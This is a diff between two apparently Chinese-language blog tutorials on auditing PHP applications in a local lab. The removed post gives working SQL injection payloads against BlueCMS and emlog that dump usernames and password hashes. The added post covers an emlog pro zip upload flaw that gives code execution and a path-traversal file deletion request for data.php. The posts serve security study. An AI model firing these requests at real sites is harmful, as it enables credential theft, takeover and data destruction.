@@ -14,15 +14,15 @@
   <meta name="theme-color">
 
   
-  <title>原生PHP代码审计-sql注入 &middot; IIIIIII的博客</title>
-    <meta name="title" content="原生PHP代码审计-sql注入 &middot; IIIIIII的博客">
+  <title>原生PHP代码审计-文件方面 &middot; IIIIIII的博客</title>
+    <meta name="title" content="原生PHP代码审计-文件方面 &middot; IIIIIII的博客">
 
   
   
-  <meta name="keywords" content="sql,">
+  <meta name="keywords" content="upload,LFI,">
   
   
-  <link rel="canonical" href="https://Starrui777.github.io/posts/code1php/">
+  <link rel="canonical" href="https://Starrui777.github.io/posts/code2php/">
   
   
   
@@ -95,45 +95,46 @@
   
 
   
-  <meta property="og:url" content="https://Starrui777.github.io/posts/code1php/">
+  <meta property="og:url" content="https://Starrui777.github.io/posts/code2php/">
   <meta property="og:site_name" content="IIIIIII的博客">
-  <meta property="og:title" content="原生PHP代码审计-sql注入">
+  <meta property="og:title" content="原生PHP代码审计-文件方面">
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2025-09-20T00:00:00+00:00">
-    <meta property="article:modified_time" content="2025-09-20T00:00:00+00:00">
-    <meta property="article:tag" content="Sql">
+    <meta property="article:published_time" content="2025-09-21T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-09-21T00:00:00+00:00">
+    <meta property="article:tag" content="Upload">
+    <meta property="article:tag" content="LFI">
 
   
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="原生PHP代码审计-sql注入">
+  <meta name="twitter:title" content="原生PHP代码审计-文件方面">
 
   <script type="application/ld+json">
   [{
     "@context": "https://schema.org",
     "@type": "Article",
     "articleSection": "Posts",
-    "name": "原生PHP代码审计-sql注入",
-    "headline": "原生PHP代码审计-sql注入",
+    "name": "原生PHP代码审计-文件方面",
+    "headline": "原生PHP代码审计-文件方面",
     
     
     "inLanguage": "en",
-    "url" : "https:\/\/Starrui777.github.io\/posts\/code1php\/",
+    "url" : "https:\/\/Starrui777.github.io\/posts\/code2php\/",
     "author" : {
       "@type": "Person",
       "name": "IIIIIIIIIIII"
     },
     "copyrightYear": "2025",
-    "dateCreated": "2025-09-20T00:00:00\u002b00:00",
-    "datePublished": "2025-09-20T00:00:00\u002b00:00",
+    "dateCreated": "2025-09-21T00:00:00\u002b00:00",
+    "datePublished": "2025-09-21T00:00:00\u002b00:00",
     
-    "dateModified": "2025-09-20T00:00:00\u002b00:00",
+    "dateModified": "2025-09-21T00:00:00\u002b00:00",
     
-    "keywords": ["sql"],
+    "keywords": ["upload","LFI"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "263"
+    "wordCount": "245"
   }]
   </script>
 
@@ -509,7 +510,7 @@
     <header id="single_header" class="mt-5 max-w-prose">
       
       <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
-        原生PHP代码审计-sql注入
+        原生PHP代码审计-文件方面
       </h1>
       <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
         
@@ -562,7 +563,7 @@
   <div class="flex flex-row flex-wrap items-center">
     
     
-      <time datetime="2025-09-20T00:00:00&#43;00:00">20 September 2025</time><span class="px-2 text-primary-500">&middot;</span><span>263 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">2 mins</span>
+      <time datetime="2025-09-21T00:00:00&#43;00:00">21 September 2025</time><span class="px-2 text-primary-500">&middot;</span><span>245 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">2 mins</span>
     
 
     
@@ -586,11 +587,21 @@
         
           
             
-              <a class="relative mt-[0.5rem] mr-2" href="/tags/sql/"
+              <a class="relative mt-[0.5rem] mr-2" href="/tags/upload/"
                 ><span class="flex cursor-pointer">
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Sql
+    Upload
+  </span>
+</span>
+</a
+              >
+            
+              <a class="relative mt-[0.5rem] mr-2" href="/tags/lfi/"
+                ><span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    LFI
   </span>
 </span>
 </a
@@ -740,11 +751,10 @@
     class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#原生php代码审计-sql注入">原生PHP代码审计-sql注入</a>
+    <li><a href="#原生php代码审计-文件方面">原生PHP代码审计-文件方面</a>
       <ul>
-        <li><a href="#案例1bluecms">案例1BLUECMS</a></li>
-        <li><a href="#案例2-emlog-后台漏洞">案例2-emlog-后台漏洞</a></li>
-        <li><a href="#案例3-emlog-pro-二次注入漏洞-219">案例3-emlog-pro 二次注入漏洞-2.1.9</a></li>
+        <li><a href="#案例1emlog-2220-后台文件上传">案例1emlog-2.2.20-后台文件上传</a></li>
+        <li><a href="#案例2-emlog-600任意文件删除">案例2-emlog-6.0.0任意文件删除</a></li>
       </ul>
     </li>
   </ul>
@@ -760,11 +770,10 @@
     class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#原生php代码审计-sql注入">原生PHP代码审计-sql注入</a>
+    <li><a href="#原生php代码审计-文件方面">原生PHP代码审计-文件方面</a>
       <ul>
-        <li><a href="#案例1bluecms">案例1BLUECMS</a></li>
-        <li><a href="#案例2-emlog-后台漏洞">案例2-emlog-后台漏洞</a></li>
-        <li><a href="#案例3-emlog-pro-二次注入漏洞-219">案例3-emlog-pro 二次注入漏洞-2.1.9</a></li>
+        <li><a href="#案例1emlog-2220-后台文件上传">案例1emlog-2.2.20-后台文件上传</a></li>
+        <li><a href="#案例2-emlog-600任意文件删除">案例2-emlog-6.0.0任意文件删除</a></li>
       </ul>
     </li>
   </ul>
@@ -786,38 +795,42 @@
 
         <div class="article-content max-w-prose mb-20">
           
-<h2 class="relative group">原生PHP代码审计-sql注入 
-    <div id="原生php代码审计-sql注入" class="anchor"></div>
+<h2 class="relative group">原生PHP代码审计-文件方面 
+    <div id="原生php代码审计-文件方面" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e5%8e%9f%e7%94%9fphp%e4%bb%a3%e7%a0%81%e5%ae%a1%e8%ae%a1-sql%e6%b3%a8%e5%85%a5" aria-label="Anchor">#</a>
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e5%8e%9f%e7%94%9fphp%e4%bb%a3%e7%a0%81%e5%ae%a1%e8%ae%a1-%e6%96%87%e4%bb%b6%e6%96%b9%e9%9d%a2" aria-label="Anchor">#</a>
     </span>        
     
 </h2>
 <!-- more --> 
-<pre tabindex="0"><code>三种方法：
-		   数据库方面-sql注入
-		   	 1：语句监控  监控sql语句是否可以利用
-		   	 2：功能跟踪
-		   	 .*单个字符 ？启动非贪婪模式
-		   	 3：正则搜索sql语句(update|select|insert|delete|).*?where.*= 
+<pre tabindex="0"><code>这里推荐用漏洞功能点来看代码 找到上传点然后看代码
+文件安全挖掘点：
+1、脚本文件名
+2、应用功能点
+3、操作关键字
+文件上传，文件下载(读取)，文件包含，文件删除等
 </code></pre>
-<h3 class="relative group">案例1BLUECMS 
-    <div id="案例1bluecms" class="anchor"></div>
+<h3 class="relative group">案例1emlog-2.2.20-后台文件上传 
+    <div id="案例1emlog-2220-后台文件上传" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e6%a1%88%e4%be%8b1bluecms" aria-label="Anchor">#</a>
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e6%a1%88%e4%be%8b1emlog-2220-%e5%90%8e%e5%8f%b0%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0" aria-label="Anchor">#</a>
     </span>        
     
 </h3>
-<pre tabindex="0"><code>搭建
-PHP选择5版本
-PHPSTUDY选中里面的uploads目录
-url输入/install安装
-设置uploads权限为可写
-设置后不管他是白屏还是怎么样直接输入根目录进入界面显示
+<pre tabindex="0"><code>安装和上一个博客一致
+https://www.cnvd.org.cn/flaw/show/CNVD-2023-74536
+</code></pre><p><a
+  href="https://www.cnvd.org.cn/flaw/show/CNVD-2023-74536"
+    target="_blank"
+  >https://www.cnvd.org.cn/flaw/show/CNVD-2023-74536</a></p>
+<p>根据漏洞描述</p>
+<pre tabindex="0"><code>emlog pro /content/templates/存在任意文件上传漏洞，远程攻击者可利用该漏洞提交特殊的请求，可上传恶意文件，以应用程序上下文执行任意代码。
+</code></pre><p>根据CNVD漏洞描述漏洞在</p>
+<pre tabindex="0"><code>emlog pro /content/templates/存在任意文件上传漏洞，远程攻击者可利用该漏洞提交特殊的请求，可上传恶意文件，以应用程序上下文执行任意代码。
 </code></pre><p>
 
 
@@ -826,14 +839,12 @@ url输入/install安装
 
 
 <figure>
-    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/php1/1.png">
+    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/php2/1.png">
 
   
 </figure>
 </p>
-<p>使用正则表达式搜索</p>
-<pre tabindex="0"><code>(update|select|insert|delete|).*?where.*?=* 锁定这个ad_js.php文件
-</code></pre><p>看到其他的admin.php可能是管理员的界面</p>
+<p>我们准备上传的文件-在他默认有一个default我们备份下上传加一个info.php里面有phpinfo</p>
 <p>
 
 
@@ -842,143 +853,61 @@ url输入/install安装
 
 
 <figure>
-    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/php1/2.2.png">
+    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/php2/2.png">
 
   
 </figure>
 </p>
-<pre tabindex="0"><code>$ad = $db-&gt;getone(&#34;SELECT * FROM &#34;.table(&#39;ad&#39;).&#34; WHERE ad_id =&#34;.$ad_id); 看这个代码的变量是否可控
+<p>上传后直接访问就可以触发任意文件执行下面看下代码怎么写的怎么找到的</p>
+<p>源码如下</p>
+<pre tabindex="0"><code>代码功能解析
+首先判断操作类型为upload_zip时执行此代码块
+调用LoginAuth::checkToken()进行登录验证和 token 检查
+获取上传的 ZIP 文件信息（$_FILES[&#39;tplzip&#39;]）
+一系列错误检查：
+检查是否未选择文件（错误码 4）
+检查文件大小超过 PHP 配置限制（错误码 1）
+检查文件上传是否有其他错误
+检查文件后缀是否为 zip
+使用emUnZip函数解压上传的 ZIP 文件到../content/templates/目录
+根据解压结果跳转到不同的页面并带上相应的错误参数
+安全问题分析
+	不仅文件上传验证不严格，更严重的是对解压后的文件没有任何安全过滤只判断了后缀是否是ZIP
+if ($action === &#39;upload_zip&#39;) {
+    LoginAuth::checkToken();
+    $zipfile = isset($_FILES[&#39;tplzip&#39;]) ? $_FILES[&#39;tplzip&#39;] : &#39;&#39;;
 
-往上看发现这个变量是通过GET传输的发现可控
-$ad_id = !empty($_GET[&#39;ad_id&#39;]) ? trim($_GET[&#39;ad_id&#39;]) : &#39;&#39;;
-if(empty($ad_id))
-{
-	echo &#39;Error!&#39;;
-	exit();
-}
-</code></pre><p>在php中.表示直接拼接我们访问试试</p>
-<pre tabindex="0"><code>输入
-URL/ad_js.php?ad_id=1%20order%20by%208 
-提示Error：Query error:SELECT * FROM blue_ad WHERE ad_id =1 order by 8
-
-输入
-URL/ad_js.php?ad_id=1%20order%20by%207
-不报错
-这里不加&#39;因为是数字不用闭合，锁定字段是7个而且有回显表示他的代码有return
-
-输入
-ad_js.php?ad_id=1%20union%20select%201,2,3,4,5,6,database()
-右键源码发现
-
-&lt;!--
-document.write(&#34;localhost&#34;);
---&gt;
-发现数据库名是localhost因为我创建时候把命令设置这个了..
-</code></pre><p>然后我们就可以sql注入查询出账号密码登录后台</p>
-<pre tabindex="0"><code>1 order by 7
-1 union select 1,2,3,4,5,6,7
-获取字段名
-1 UNION SELECT 1,2,3,4,5,6,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()
-得到blue_user 0x626C75655F75736572这是他的16进制 防止转义报错
-1 UNION SELECT 1,2,3,4,5,6,group_concat(column_name) FROM information_schema.columns WHERE table_schema=database() and table_name=0x626C75655F75736572
-得到 字段
-user_id,user_name,pwd,email,birthday,sex,money,face_pic,mobile_phone,home_phone,office_phone,qq,msn,address,reg_time,last_login_time,last_login_ip
-
-1%20UNION%20SELECT%201,2,3,4,5,6,group_concat(user_name,0x3a,pwd)%20from%20blue_user
-得到数据 document.write(&#34;root:63a9f0ea7bb98050796b649e85481845&#34;); 0x3a表示冒号进行拼接
-</code></pre><p>
-
-
-
-
-
-
-<figure>
-    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/php1/3.png">
-
-  
-</figure>
-</p>
-<p>如果没有回显 就用sqlmap跑延时注入</p>
-
-<h3 class="relative group">案例2-emlog-后台漏洞 
-    <div id="案例2-emlog-后台漏洞" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e6%a1%88%e4%be%8b2-emlog-%e5%90%8e%e5%8f%b0%e6%bc%8f%e6%b4%9e" aria-label="Anchor">#</a>
-    </span>        
-    
-</h3>
-<pre tabindex="0"><code>安装说明 emlog_6.0.0
-PHP7版本直接输入URL可搭建
-提前构建数据库
-</code></pre><p>通过CNVD-漏洞描述找到文件</p>
-<p>找到这个地方</p>
-<p>
-
-
-
-
-
-
-<figure>
-    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/php1/4.png">
-
-  
-</figure>
-</p>
-<p>这里的sql语句没有防护</p>
-<pre tabindex="0"><code>代码中的 SQL 语句直接将用户输入的$ip变量拼接到查询中，没有进行任何过滤或参数化处理：
-假设$ip的值被传入：127.0.0.1&#39; OR &#39;1&#39;=&#39;1，那么实际执行的 SQL 会变成：
--- 查询语句会变成：
-SELECT DISTINCT gid FROM 表名 WHERE ip=&#39;127.0.0.1&#39; OR &#39;1&#39;=&#39;1&#39;
-
--- 删除语句会变成：
-DELETE FROM 表名 WHERE ip=&#39;127.0.0.1&#39; OR &#39;1&#39;=&#39;1&#39;
-</code></pre><p>
-
-
-
-
-
-
-<figure>
-    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/php1/5.png">
-
-  
-</figure>
-</p>
-<p>触发需要/admin/comment.php?action=delbyip</p>
-<pre tabindex="0"><code>/admin/comment.php?action=delbyip
-</code></pre><p>提示</p>
-<p>
-
-
-
-
-
-
-<figure>
-    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/php1/6.png">
-
-  
-</figure>
-</p>
-<p>这里需要放上去token</p>
-<pre tabindex="0"><code>  代码说检查这里的token 赋值为token=xx我们可以试试
-  public static function genToken() {
-        $token_cookie_name = &#39;EM_TOKENCOOKIE_&#39; . md5(substr(AUTH_KEY, 16, 32) . UID);
-        if (isset($_COOKIE[$token_cookie_name])) {
-            return $_COOKIE[$token_cookie_name];
-        } else {
-            $token = md5(getRandStr(16));
-            setcookie($token_cookie_name, $token, 0, &#39;/&#39;);
-            return $token;
-        }
+    if ($zipfile[&#39;error&#39;] == 4) {
+        emDirect(&#34;./template.php?error_d=1&#34;);
     }
-</code></pre><p>输入token后跳到了这里</p>
-<p>URL/admin/comment.php?action=delbyip&amp;token=844dcfdf25339db310d07c152cdb3794</p>
+    if ($zipfile[&#39;error&#39;] == 1) {
+        emDirect(&#34;./template.php?error_f=1&#34;);
+    }
+    if (!$zipfile || $zipfile[&#39;error&#39;] &gt; 0 || empty($zipfile[&#39;tmp_name&#39;])) {
+        emMsg(&#39;模板上传失败， 错误码：&#39; . $zipfile[&#39;error&#39;]);
+    }
+    if (getFileSuffix($zipfile[&#39;name&#39;]) != &#39;zip&#39;) {
+        emDirect(&#34;./template.php?error_a=1&#34;);
+    }
+
+    $ret = emUnZip($zipfile[&#39;tmp_name&#39;], &#39;../content/templates/&#39;, &#39;tpl&#39;);
+    switch ($ret) {
+        case 0:
+            emDirect(&#34;./template.php?activate_install=1&#34;);
+            break;
+        case -2:
+            emDirect(&#34;./template.php?error_e=1&#34;);
+            break;
+        case 1:
+        case 2:
+            emDirect(&#34;./template.php?error_b=1&#34;);
+            break;
+        case 3:
+            emDirect(&#34;./template.php?error_c=1&#34;);
+            break;
+    }
+}
+</code></pre><p>所以这里还有一个插件也是一样的所以你找到了模板上传也找得到插件上传</p>
 <p>
 
 
@@ -987,47 +916,7 @@ DELETE FROM 表名 WHERE ip=&#39;127.0.0.1&#39; OR &#39;1&#39;=&#39;1&#39;
 
 
 <figure>
-    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/php1/7.png">
-
-  
-</figure>
-</p>
-<p>现在我们就代入我们IP参数来注入了因为逻辑往下走了</p>
-<pre tabindex="0"><code>因为这里没有回显所以我们报错注入 0x7e是~报错时候容易识别
-admin/comment.php?action=delbyip&amp;token=844dcfdf25339db310d07c152cdb3794&amp;ip=127.0.0.1%27and(extractvalue(1,concat(0x7e,(select%20user()),0x7e)))%20--+
-
-1 获得数据库名
-XPATH syntax error: &#39;~emlog1~&#39;
-
-admin/comment.php?action=delbyip&amp;token=844dcfdf25339db310d07c152cdb3794&amp;ip=127.0.0.1%27and(extractvalue(1,concat(0x7e,(select%20database()),0x7e)))%20--+
-2 
-因为显示不全判断长度是123后
-admin/comment.php?action=delbyip&amp;token=844dcfdf25339db310d07c152cdb3794&amp;ip=127.0.0.1%27and(extractvalue(1,concat(0x7e,(select%20length(group_concat(table_name)) from information_schema.tables where table_schema=&#39;emlog1&#39;),0x7e)))%20--+
-3 从110字符开始获取得到一个表叫emlog_user
-admin/comment.php?action=delbyip&amp;token=844dcfdf25339db310d07c152cdb3794&amp;ip=127.0.0.1%27and(extractvalue(1,concat(0x7e,(select%20substr(group_concat(table_name),110,30) from information_schema.tables where table_schema=&#39;emlog1&#39;),0x7e)))%20--+
-或者
-用limit 跳过前9个表名，返回第10个表名（因为计数从0开始）。
-and(extractvalue(1,concat(0x7e,(select count(table_name) from information_schema.tables where table_schema=&#39;emlog1&#39;),0x7e))) -- 得到10个
-
-and(extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;emlog1&#39; limit 9,1),0x7e))) --查看得到emlog_user
-
-4
-得到字段
-~uid,username,password,nickname,&#39;
-admin/comment.php?action=delbyip&amp;token=844dcfdf25339db310d07c152cdb3794&amp;ip=127.0.0.1%27and(extractvalue(1,concat(0x7e,(select%20group_concat(column_name) from information_schema.columns  where table_schema=&#39;emlog1&#39; and table_name=&#39;emlog_user&#39;),0x7e)))%20--+
-
-5获取数据
-XPATH syntax error: &#39;~root:$P$ByE7sTdselj5Pr83iphFe0eL&#39;
-admin/comment.php?action=delbyip&amp;token=844dcfdf25339db310d07c152cdb3794&amp;ip=127.0.0.1%27and(extractvalue(1,concat(0x7e,(select%20group_concat(username,0x3a,password) from emlog_user),0x7e)))%20--+
-</code></pre><p>
-
-
-
-
-
-
-<figure>
-    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/php1/8.png">
+    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/php2/3.png">
 
   
 </figure>
@@ -1040,23 +929,74 @@ admin/comment.php?action=delbyip&amp;token=844dcfdf25339db310d07c152cdb3794&amp;
 
 
 <figure>
-    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/php1/9.png">
+    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/php2/4.png">
 
   
 </figure>
 </p>
+<p>代码一摸一样</p>
+<pre tabindex="0"><code>没有限制PHP安装，没有限制函数，只检查后缀
+if ($action == &#39;upload_zip&#39;) {
+    LoginAuth::checkToken();
+    $zipfile = isset($_FILES[&#39;pluzip&#39;]) ? $_FILES[&#39;pluzip&#39;] : &#39;&#39;;
 
-<h3 class="relative group">案例3-emlog-pro 二次注入漏洞-2.1.9 
-    <div id="案例3-emlog-pro-二次注入漏洞-219" class="anchor"></div>
+    if ($zipfile[&#39;error&#39;] == 4) {
+        emDirect(&#34;./plugin.php?error_d=1&#34;);
+    }
+    if ($zipfile[&#39;error&#39;] == 1) {
+        emDirect(&#34;./plugin.php?error_g=1&#34;);
+    }
+    if (!$zipfile || $zipfile[&#39;error&#39;] &gt;= 1 || empty($zipfile[&#39;tmp_name&#39;])) {
+        emMsg(&#39;插件上传失败， 错误码：&#39; . $zipfile[&#39;error&#39;]);
+    }
+    if (getFileSuffix($zipfile[&#39;name&#39;]) != &#39;zip&#39;) {
+        emDirect(&#34;./plugin.php?error_f=1&#34;);
+    }
+
+    $ret = emUnZip($zipfile[&#39;tmp_name&#39;], &#39;../content/plugins/&#39;, &#39;plugin&#39;);
+    switch ($ret) {
+        case 0:
+            emDirect(&#34;./plugin.php?activate_install=1&#34;);
+            break;
+        case -1:
+            emDirect(&#34;./plugin.php?error_e=1&#34;);
+            break;
+        case 1:
+        case 2:
+            emDirect(&#34;./plugin.php?error_b=1&#34;);
+            break;
+        case 3:
+            emDirect(&#34;./plugin.php?error_c=1&#34;);
+            break;
+    }
+}
+</code></pre>
+<h3 class="relative group">案例2-emlog-6.0.0任意文件删除 
+    <div id="案例2-emlog-600任意文件删除" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e6%a1%88%e4%be%8b3-emlog-pro-%e4%ba%8c%e6%ac%a1%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e-219" aria-label="Anchor">#</a>
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e6%a1%88%e4%be%8b2-emlog-600%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e5%88%a0%e9%99%a4" aria-label="Anchor">#</a>
     </span>        
     
 </h3>
-<p>使用工具MySQLMonitor-1.1.jar工具监控mysql代码</p>
-<p>其他数据库有自带监控</p>
+<p>找到后台界面系统-&gt;数据锁定文件data.php 找到代码是</p>
+<pre tabindex="0"><code>非常简单暴力 注意这里bak是数组前端是
+&lt;td width=&#34;22&#34;&gt;&lt;input type=&#34;checkbox&#34; value=&#34;&lt;?php echo $value; ?&gt;&#34; name=&#34;bak[]&#34; class=&#34;ids&#34; /&gt;&lt;/td&gt;
+if ($action == &#39;dell_all_bak&#39;) {
+    if (!isset($_POST[&#39;bak&#39;])) {
+        emDirect(&#39;./data.php?error_a=1&#39;);
+    } else{
+        foreach ($_POST[&#39;bak&#39;] as $val) {
+            unlink($val);
+        }
+        emDirect(&#39;./data.php?active_del=1&#39;);
+    }
+}
+http://192.168.1.56:900//admin/data.php?action=dell_all_bak
+
+bak[]=../../../../../../../1.txt 可以删除根目录文件
+</code></pre><p>直接构造数据包任意删除</p>
 <p>
 
 
@@ -1065,63 +1005,7 @@ admin/comment.php?action=delbyip&amp;token=844dcfdf25339db310d07c152cdb3794&amp;
 
 
 <figure>
-    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/php1/10.png">
-
-  
-</figure>
-</p>
-<p>后端代码可以知道这里的emer是数据库中的nickname数值</p>
-<p>
-
-
-
-
-
-
-<figure>
-    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/php1/11.png">
-
-  
-</figure>
-</p>
-<p>cnvd中说了是二次注入我们就要找哪里可以修改nickname答案是系统中的上传数据库文件</p>
-<p>
-
-
-
-
-
-
-<figure>
-    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/php1/12.png">
-
-  
-</figure>
-</p>
-<p>插入这段在数据中 再上传</p>
-<p>
-
-
-
-
-
-
-<figure>
-    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/php1/13.png">
-
-  
-</figure>
-</p>
-<p>可以发现select 执行了</p>
-<p>
-
-
-
-
-
-
-<figure>
-    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/php1/14.png">
+    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/php2/5.png">
 
   
 </figure>
@@ -1141,6 +1025,129 @@ admin/comment.php?action=delbyip&amp;token=844dcfdf25339db310d07c152cdb3794&amp;
   
     <h2 class="mt-8 text-2xl font-extrabold mb-10">Related</h2>
     <section class="w-full grid gap-4 sm:grid-cols-2 md:grid-cols-3">
+      
+        
+<div
+  class="group-hover-card group relative min-h-full min-w-full overflow-hidden rounded border border-2 border-neutral-200 shadow-2xl dark:border-neutral-700">
+  <a
+    
+  href="/posts/code1php/"
+    class="absolute inset-0"
+    aria-label="原生PHP代码审计-sql注入"></a>
+      
+    
+        
+          <div
+            class="thumbnail_card_related nozoom w-full"
+            style="background-image:url(/image/background.svg);"></div>
+        
+      
+  <div class="px-6 py-4">
+    
+      <div
+        class="group-hover-card-title decoration-primary-500 dark:text-neutral text-xl font-bold text-neutral-800 group-hover:underline group-hover:underline-offset-2">
+        原生PHP代码审计-sql注入
+      </div>
+    
+    <div class="group-hover-cancel text-sm text-neutral-500 dark:text-neutral-400">
+      
+
+
+
+
+
+
+
+  
+
+  
+  
+  
+
+  
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2025-09-20T00:00:00&#43;00:00">20 September 2025</time><span class="px-2 text-primary-500">&middot;</span><span>263 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">2 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+
+  
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+      
+        
+          
+        
+      
+        
+      
+        
+          
+            
+              <a class="relative mt-[0.5rem] mr-2" href="/tags/sql/"
+                ><span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Sql
+  </span>
+</span>
+</a
+              >
+            
+          
+        
+      
+    </div>
+  
+
+  
+  
+
+
+
+    </div>
+    
+  </div>
+  <div class="px-6 pt-4 pb-2"></div>
+</div>
+
       
         
 <div
@@ -1684,129 +1691,6 @@ admin/comment.php?action=delbyip&amp;token=844dcfdf25339db310d07c152cdb3794&amp;
 </div>
 
       
-        
-<div
-  class="group-hover-card group relative min-h-full min-w-full overflow-hidden rounded border border-2 border-neutral-200 shadow-2xl dark:border-neutral-700">
-  <a
-    
-  href="/posts/poppips-mazasec/"
-    class="absolute inset-0"
-    aria-label="poppips-mazasec"></a>
-      
-    
-        
-          <div
-            class="thumbnail_card_related nozoom w-full"
-            style="background-image:url(/image/background.svg);"></div>
-        
-      
-  <div class="px-6 py-4">
-    
-      <div
-        class="group-hover-card-title decoration-primary-500 dark:text-neutral text-xl font-bold text-neutral-800 group-hover:underline group-hover:underline-offset-2">
-        poppips-mazasec
-      </div>
-    
-    <div class="group-hover-cancel text-sm text-neutral-500 dark:text-neutral-400">
-      
-
-
-
-
-
-
-
-  
-
-  
-  
-  
-
-  
-  
-    
-  
-
-  
-    
-  
-
-  
-
-  
-    
-  
-
-  
-    
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  <div class="flex flex-row flex-wrap items-center">
-    
-    
-      <time datetime="2025-09-03T00:00:00&#43;00:00">3 September 2025</time><span class="px-2 text-primary-500">&middot;</span><span>1025 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">5 mins</span>
-    
-
-    
-    
-  </div>
-
-  
-
-  
-  
-    <div class="flex flex-row flex-wrap items-center">
-      
-        
-      
-        
-          
-        
-      
-        
-      
-        
-          
-            
-              <a class="relative mt-[0.5rem] mr-2" href="/tags/linux/"
-                ><span class="flex cursor-pointer">
-  <span
-    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Linux
-  </span>
-</span>
-</a
-              >
-            
-          
-        
-      
-    </div>
-  
-
-  
-  
-
-
-
-    </div>
-    
-  </div>
-  <div class="px-6 pt-4 pb-2"></div>
-</div>
-
-      
     </section>
   
 
@@ -1826,8 +1710,8 @@ admin/comment.php?action=delbyip&amp;token=844dcfdf25339db310d07c152cdb3794&amp;
           type="text/javascript"
           src="/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js"
           integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA=="
-          data-oid="views_posts\code1php.md"
-          data-oid-likes="likes_posts\code1php.md"></script>
+          data-oid="views_posts\code2php.md"
+          data-oid-likes="likes_posts\code2php.md"></script>
       
     </section>
 
@@ -1843,7 +1727,7 @@ admin/comment.php?action=delbyip&amp;token=844dcfdf25339db310d07c152cdb3794&amp;
       <div class="flex justify-between pt-3">
         <span>
           
-            <a class="flex group mr-3" href="/posts/halfhour/">
+            <a class="flex group mr-3" href="/posts/code1php/">
               <span
